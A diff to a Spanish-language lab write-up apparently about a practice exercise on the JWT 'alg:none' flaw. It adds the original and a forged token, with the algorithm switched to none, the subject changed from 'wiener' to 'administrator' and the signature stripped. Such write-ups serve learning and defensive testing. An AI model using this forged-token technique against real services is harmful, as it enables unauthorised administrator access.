@@ -15,6 +15,20 @@ tags:
 ## Qué muestra
 El server **acepta tokens "sin firmar"** cuando `alg` es `none`. Ponés `alg:none`, editás el claim y **borrás la firma** (dejando el punto final).
 
+## JWT (original → modificado)
+
+**Original** (decodificado)
+```json
+{ "alg": "HS256", "typ": "JWT" }   // header
+{ "sub": "wiener" }                // payload
+```
+**Modificado**
+```json
+{ "alg": "none", "typ": "JWT" }    // header   ← cambiado
+{ "sub": "administrator" }         // payload  ← cambiado
+```
+> **Firma:** **eliminada** → el token queda `header.payload.` (3ª parte vacía).
+
 ## Diagrama
 
 ```mermaid
